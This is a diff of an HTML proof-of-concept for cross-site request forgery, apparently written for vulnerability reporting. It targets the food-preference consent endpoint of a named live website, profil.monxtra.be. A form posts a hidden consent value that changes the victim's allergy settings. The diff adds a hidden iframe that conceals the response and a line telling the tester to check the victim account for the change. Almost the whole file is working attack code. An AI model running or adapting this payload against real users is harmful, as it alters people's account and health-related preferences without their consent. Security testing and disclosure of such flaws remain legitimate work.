@@ -1,21 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CSRF PoC - Food Preference Consent</title>
+  <title>CSRF PoC</title>
 </head>
 <body>
-  <h2>CSRF PoC</h2>
+  <h2>CSRF PoC - Food Preference Consent</h2>
+  <p>Click the button below to send the request.</p>
 
-  <form action="https://profil.monxtra.be/manage-profile/food-preferences/consents/manage?code=PREF_CELERY_NEW&category=CAT_ALLERGY&_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2Fconsents.manage%2Findex"
-        method="POST"
-        enctype="application/x-www-form-urlencoded">
+  <form
+    action="https://profil.monxtra.be/manage-profile/food-preferences/consents/manage?code=PREF_CELERY_NEW&category=CAT_ALLERGY&_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2Fconsents.manage%2Findex"
+    method="POST"
+    target="csrfFrame"
+    enctype="application/x-www-form-urlencoded">
 
-    <input type="hidden"
-           name="acceptedConsents"
-           value="X_CS_LIFESTYLE_AND_ALLERGEN_PRODUCTINFO">
-
-    <input type="submit" value="Submit CSRF Request">
+    <input type="hidden" name="acceptedConsents" value="X_CS_LIFESTYLE_AND_ALLERGEN_PRODUCTINFO">
+    <button type="submit">Submit CSRF</button>
   </form>
 
+  <iframe name="csrfFrame" style="display:none;"></iframe>
+
+  <p>After clicking, check the victim account profile to confirm whether the consent/allergy preference changed.</p>
 </body>
 </html>
